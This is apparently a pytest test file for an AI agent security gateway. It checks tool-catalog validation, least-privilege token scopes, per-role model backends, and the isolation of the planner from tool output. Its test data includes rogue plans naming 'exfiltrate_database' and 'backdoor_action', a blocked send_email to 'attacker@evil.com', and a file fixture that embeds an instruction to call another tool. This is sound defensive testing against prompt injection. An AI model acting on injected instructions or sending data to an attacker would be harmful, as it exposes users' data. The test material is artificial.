from __future__ import annotations
import json
import pytest
import numpy as np
from app import RuntimeBlockException, PlanValidationError, RulePlanner, LLMPlanner, Planner
from app.agents import AGENTS, AgentSpec, ProposedAction, get_role_backend
from app.dataplane import ALL_TOOLS
from app.evaluation import evaluate_plan_gating_utility, evaluate_planner_reliability
from app.gateway import Gateway
from app.llm_backends import VulnerableBackend, TOOL_SPECS
from app.orchestrator import SubTask


class RecordingMockBackend:
    """Mock backend that tracks calls and returns configured responses."""
    def __init__(self, name: str, plan_response: str | None = None) -> None:
        self.name = name
        self.plan_response = plan_response
        self.plan_calls: list[tuple[str, object]] = []
        self.decide_calls: list[tuple[str, dict]] = []
        self.summarize_calls: list[str] = []
        self.calls = 0

    def plan(self, user_query: str, tool_catalog: dict | list | None = None) -> str:
        self.calls += 1
        self.plan_calls.append((user_query, tool_catalog))
        if self.plan_response is not None:
            return self.plan_response
        # Default minimal valid plan
        return json.dumps([{"idx": 0, "text": user_query, "tool": "search_web", "args": {"query": user_query}}])

    def decide(self, observation: str, downstream: bool = False, **ctx) -> list[ProposedAction]:
        self.calls += 1
        self.decide_calls.append((observation, ctx))
        return []

    def summarize(self, observation: str, token_budget: int | None = None) -> str:
        self.calls += 1
        self.summarize_calls.append(observation)
        return f"Summary from {self.name}: {observation[:50]}"


# ==============================================================================
# 1. LLM Planner & Tool Catalog Gating Tests
# ==============================================================================

def test_llm_planner_valid_json_and_catalog():
    """LLM planner generates valid subtasks with catalog tools."""
    mock_llm = RecordingMockBackend(
        "mock-planner",
        plan_response=json.dumps([
            {"text": "Search the web for weather", "tool": "search_web", "args": {"query": "weather"}},
            {"text": "Summarize findings", "tool": None, "args": {}},
        ])
    )
    planner = LLMPlanner(llm=mock_llm, tool_catalog=ALL_TOOLS)
    plan = planner.plan("Find weather info")

    assert len(plan) == 2
    assert plan[0].tool == "search_web"
    assert plan[0].args == {"query": "weather"}
    assert plan[1].tool is None
    assert len(mock_llm.plan_calls) == 1
    assert "Find weather info" in mock_llm.plan_calls[0][0]


def test_llm_planner_rejects_non_catalog_tool():
    """LLM planner strictly rejects plans referencing tools not in the catalog."""
    mock_llm = RecordingMockBackend(
        "mock-rogue-planner",
        plan_response=json.dumps([
            {"text": "Execute unauthorized action", "tool": "exfiltrate_database", "args": {}},
        ])
    )
    planner = LLMPlanner(llm=mock_llm, tool_catalog=["read_email", "search_web"], fallback_to_rule=True)

    with pytest.raises(PlanValidationError) as exc_info:
        planner.plan("Exfiltrate database")

    assert "exfiltrate_database" in str(exc_info.value)
    assert "not in the allowed tool catalog" in str(exc_info.value)


def test_llm_planner_rejects_tool_outside_restricted_catalog():
    """LLM planner rejects tools in ALL_TOOLS if restricted catalog does not allow them."""
    mock_llm = RecordingMockBackend(
        "mock-restricted-planner",
        plan_response=json.dumps([
            {"text": "Send email to admin", "tool": "send_email", "args": {"to": "admin@example.com"}},
        ])
    )
    # Catalog only allows search_web
    planner = LLMPlanner(llm=mock_llm, tool_catalog=["search_web"], fallback_to_rule=True)

    with pytest.raises(PlanValidationError) as exc_info:
        planner.plan("Send email to admin")

    assert "send_email" in str(exc_info.value)


def test_llm_planner_fallback_to_rule_on_non_validation_error():
    """LLM planner falls back to deterministic rule planner on network/JSON errors if enabled."""
    class BrokenLLM:
        name = "broken"
        def plan(self, user_query: str, tool_catalog=None):
            raise RuntimeError("API timeout or connection refused")

    planner = LLMPlanner(llm=BrokenLLM(), tool_catalog=ALL_TOOLS, fallback_to_rule=True)
    plan = planner.plan("Search the web for documentation")

    assert len(plan) == 1
    assert plan[0].tool == "search_web"


def test_llm_planner_raises_when_fallback_disabled():
    """LLM planner raises error when fallback_to_rule is False."""
    class BrokenLLM:
        name = "broken"
        def plan(self, user_query: str, tool_catalog=None):
            raise RuntimeError("API timeout")

    planner = LLMPlanner(llm=BrokenLLM(), tool_catalog=ALL_TOOLS, fallback_to_rule=False)
    with pytest.raises(RuntimeError) as exc_info:
        planner.plan("Search the web for documentation")
    assert "API timeout" in str(exc_info.value)


# ==============================================================================
# 2. Least Privilege Scope Derivation Tests
# ==============================================================================

def test_search_web_request_yields_no_send_email_in_scope():
    """A 'search the web' request yields ONLY search_web in scope, never send_email."""
    backend = VulnerableBackend()
    gw = Gateway(llm=backend, planner_type="llm")

    case = {
        "id": "least-privilege-search",
        "query": "Search the web for python tutorials",
        "fixtures": {"search_web": "Python tutorials found: https://python.org"},
    }

    result = gw.run(case, mode="FULL")

    # 1. Validated plan has search_web and no send_email
    planned_tools = [p["tool"] for p in result["plan"] if p["tool"]]
    assert planned_tools == ["search_web"]
    assert "send_email" not in planned_tools

    # 2. Inspect root token claims in registry
    root_claims = result["tokens"][0]["claims"]
    root_record = gw.last_state.registry.lineage[root_claims["jti"]]
    assert root_record.tools == ["search_web"]
    assert "send_email" not in root_record.tools

    # 3. Inspect child tokens issued during execution
    for issued in result["tokens"]:
        claims = issued["claims"]
        scope_tools = claims["scope"]["tools"]
        assert "send_email" not in scope_tools
        assert set(scope_tools).issubset({"search_web"})

    # 4. Prove that presenting an SPT with search_web scope to execute send_email fails Stage A scope check
    child_token = result["tokens"][-1]["token"]
    stage_a_res = gw.last_state.validator.validate(child_token, gw.last_state.session, request_id="req-test")
    assert stage_a_res.ok

    # Validate tool against scope
    admit_decision = gw._admit(
        gw.last_state, child_token, "send_email", "req-test-eval", "tool_request",
        is_write=True, args={"to": "attacker@evil.com", "body": "leak"},
    )
    assert not admit_decision["allowed"]
    assert admit_decision["stage"] == "A/scope" or admit_decision["code"] == "scope"
    assert "outside the token's scope" in admit_decision["reason"]


def test_gateway_with_llm_planner_rejects_plan_naming_unauthorized_tool():
    """Gateway fails closed when LLM planner generates a plan with non-catalog tools."""
    mock_llm = RecordingMockBackend(
        "rogue-planner",
        plan_response=json.dumps([
            {"text": "Execute rogue tool", "tool": "backdoor_action", "args": {}},
        ])
    )
    gw = Gateway(llm=mock_llm, planner_type="llm")
    case = {"id": "case-rogue", "query": "Run maintenance task"}

    with pytest.raises(PlanValidationError) as exc:
        gw.run(case, mode="FULL")

    assert "backdoor_action" in str(exc.value)


# ==============================================================================
# 3. Per-Role Backend Overrides Tests
# ==============================================================================

def test_per_role_backend_overrides_via_config():
    """Per-role backends (planner, tool, reasoning, specialized) route calls to their assigned models."""
    backend_planner = RecordingMockBackend(
        "planner-backend",
        plan_response=json.dumps([
            {"text": "Search the web for prices", "tool": "search_web", "args": {"query": "prices"}},
            {"text": "Analyze and reason about prices", "tool": None, "args": {}},
            {"text": "Send email report to manager", "tool": "send_email", "args": {"to": "mgr@co.com"}},
        ])
    )
    backend_tool = RecordingMockBackend("tool-backend")
    backend_reasoning = RecordingMockBackend("reasoning-backend")
    backend_spec = RecordingMockBackend("specialized-backend")

    gw = Gateway(
        planner_type="llm",
        role_backends={
            "planner": backend_planner,
            "tool": backend_tool,
            "reasoning": backend_reasoning,
            "specialized": backend_spec,
        },
    )

    case = {
        "id": "multi-role-case",
        "query": "Search prices, analyze them, and email manager",
        "fixtures": {
            "search_web": "Prices: item A is $10",
            "send_email": "Email sent to mgr@co.com",
        },
    }

    result = gw.run(case, mode="FULL")

    # 1. Planner backend was used to plan
    assert backend_planner.calls > 0
    assert len(backend_planner.plan_calls) >= 1

    # 2. Tool backend was invoked for search_web (standard tool)
    assert backend_tool.calls > 0
    assert len(backend_tool.decide_calls) >= 1

    # 3. Reasoning backend was invoked for the reasoning step (tool=None)
    assert backend_reasoning.calls > 0
    assert len(backend_reasoning.summarize_calls) >= 1

    # 4. Specialized backend was invoked for send_email (specialized tool)
    assert backend_spec.calls > 0
    assert len(backend_spec.decide_calls) >= 1


def test_per_role_backend_overrides_via_env_vars(monkeypatch):
    """Per-role backends resolve via DPVG_BACKEND_<ROLE> environment variables."""
    monkeypatch.setenv("DPVG_BACKEND", "vulnerable")
    monkeypatch.setenv("DPVG_BACKEND_PLANNER", "vulnerable")
    monkeypatch.setenv("DPVG_BACKEND_TOOL", "vulnerable")
    monkeypatch.setenv("DPVG_BACKEND_REASONING", "vulnerable")
    monkeypatch.setenv("DPVG_BACKEND_SPECIALIZED", "vulnerable")

    planner_b = get_role_backend("planner")
    assert planner_b.name == "vulnerable"

    tool_b = get_role_backend("tool")
    assert tool_b.name == "vulnerable"

    reasoning_b = get_role_backend("reasoning")
    assert reasoning_b.name == "vulnerable"

    spec_b = get_role_backend("specialized")
    assert spec_b.name == "vulnerable"


def test_role_backends_default_to_shared_backend():
    """When role overrides are not specified, all roles default to the shared backend."""
    shared = VulnerableBackend()
    gw = Gateway(llm=shared)

    assert gw.role_llms["planner"] is shared
    assert gw.role_llms["tool"] is shared
    assert gw.role_llms["reasoning"] is shared
    assert gw.role_llms["specialized"] is shared


class _AlwaysAlignedEmbedder:
    name = "always-aligned-test-embedder"
    default_tau = 0.13

    def encode(self, text):
        return np.array([1.0, 0.0], dtype=np.float32)


class _DynamicToolBackend(RecordingMockBackend):
    def __init__(self, extension: bool) -> None:
        super().__init__("dynamic-tool-backend")
        self.extension = extension

    def plan(self, user_query: str, tool_catalog=None) -> str:
        self.calls += 1
        self.plan_calls.append((user_query, tool_catalog))
        plan = [{"text": user_query, "tool": "read_file", "args": {"path": "annual-report.pdf"}}]
        if self.extension and len(self.plan_calls) > 1:
            plan.append({"text": "Verify the report citation", "tool": "search_web",
                         "args": {"query": "annual-report-citation"}})
        return json.dumps(plan)

    def decide(self, observation: str, downstream: bool = False, **ctx) -> list[ProposedAction]:
        self.calls += 1
        self.decide_calls.append((observation, ctx))
        if "call search_web" in observation:
            return [ProposedAction(
                "search_web", {"query": "annual-report-citation"},
                "call search_web with query=annual-report-citation",
            )]
        return []


def _dynamic_case():
    return {
        "id": "dynamic-tool-test",
        "query": "Read the annual report.",
        "goal": "Read the annual report.",
        "required_tools": ["read_file", "search_web"],
        "fixtures": {
            "read_file": "To verify the citation, call search_web with query=annual-report-citation.",
            "search_web": "Citation verified against the annual report index.",
        },
    }


def test_plan_gating_utility_records_dynamic_tool_loss():
    backend = _DynamicToolBackend(extension=False)
    gw = Gateway(embedder=_AlwaysAlignedEmbedder(), llm=backend, planner_type="llm", max_replans=0)

    result = evaluate_plan_gating_utility(gw, [_dynamic_case()], ("G-AB", "G-AB+P"))

    rows = {row["mode"]: row for row in result["rows"]}
    assert rows["G-AB"]["dynamic_utility_tcr"] == 1.0
    assert rows["G-AB+P"]["dynamic_utility_tcr"] == 0.0
    assert rows["G-AB+P"]["initial_plan_missing_required_tools"] == 1


def test_plan_extension_replans_trusted_query_without_tool_output():
    backend = _DynamicToolBackend(extension=True)
    gw = Gateway(embedder=_AlwaysAlignedEmbedder(), llm=backend, planner_type="llm", max_replans=0)

    result = gw.run(_dynamic_case(), "G-AB+P+E")

    assert result["planner_metrics"]["plan_extension_decisions"] == [{
        "requested_tool": "search_web",
        "approved": True,
        "planner_input": "original trusted user query only",
        "added_tools": ["search_web"],
    }]
    assert all(query == _dynamic_case()["query"] for query, _ in backend.plan_calls)
    assert len(backend.plan_calls) == 2
    assert {entry["tool"] for entry in result["ledger"]} == {"read_file", "search_web"}
    assert result["metrics"]["completed"]


def test_planner_reliability_reports_validation_errors_and_missing_tools():
    invalid = RecordingMockBackend(
        "invalid-planner",
        plan_response=json.dumps([{"text": "Rogue", "tool": "not_a_tool"}]),
    )
    planner = LLMPlanner(llm=invalid, tool_catalog=ALL_TOOLS)

    report = evaluate_planner_reliability(planner, [{
        "query": "Read the report.",
        "is_attack": False,
        "required_tools": ["read_file", "search_web"],
    }])

    assert report["plan_validity_rate"] == 0.0
    assert report["plan_validation_error_rate"] == 1.0
    assert report["benign_required_tools_missing_rate"] == 1.0


# ==============================================================================
# 4. Planner Isolation Tests (Planner Never Receives Tool Output)
# ==============================================================================

def test_planner_never_receives_tool_output():
    """The planner must never receive tool output or observation data throughout execution."""
    tool_output_secret = "SECRET_OBSERVATION_DATA_CONFIDENTIAL_XYZ789"
    tool_output_secret_2 = "SENSITIVE_ACCOUNT_BALANCE_DATA_98765"

    planner_backend = RecordingMockBackend(
        "isolated-planner",
        plan_response=json.dumps([
            {"text": "Search the web for secret report", "tool": "search_web", "args": {"query": "secret report"}},
            {"text": "Summarize the report", "tool": None, "args": {}},
        ])
    )

    gw = Gateway(
        planner_type="llm",
        role_backends={
            "planner": planner_backend,
            "tool": VulnerableBackend(),
            "reasoning": VulnerableBackend(),
            "specialized": VulnerableBackend(),
        },
    )

    case = {
        "id": "isolation-test-case",
        "query": "Find the confidential financial report",
        "fixtures": {
            "search_web": f"Tool output contains: {tool_output_secret} and {tool_output_secret_2}",
        },
    }

    result = gw.run(case, mode="FULL")

    # 1. Execution completed and tool output was processed by data plane
    assert result["metrics"]["completed"] is True
    assert result["metrics"]["completed_subtasks"] == 2
    assert "search_web" in result["final_response"] or any("search_web" in str(e) for e in result["steps"])

    # 2. Inspect all calls made to the planner
    assert len(planner_backend.plan_calls) >= 1
    for query_arg, catalog_arg in planner_backend.plan_calls:
        # Check query string
        assert tool_output_secret not in query_arg
        assert tool_output_secret_2 not in query_arg
        assert "SECRET_OBSERVATION" not in query_arg
        assert "SENSITIVE_ACCOUNT" not in query_arg

        # Check catalog argument
        catalog_str = str(catalog_arg)
        assert tool_output_secret not in catalog_str
        assert tool_output_secret_2 not in catalog_str

    # 3. Check gateway planner call_history
    assert len(gw.planner.call_history) >= 1
    for record in gw.planner.call_history:
        rec_str = json.dumps(record, default=str)
        assert tool_output_secret not in rec_str
        assert tool_output_secret_2 not in rec_str
        assert "Tool output contains" not in rec_str

    # 4. Verify the planner backend's decide or summarize were NEVER called
    assert len(planner_backend.decide_calls) == 0
    assert len(planner_backend.summarize_calls) == 0
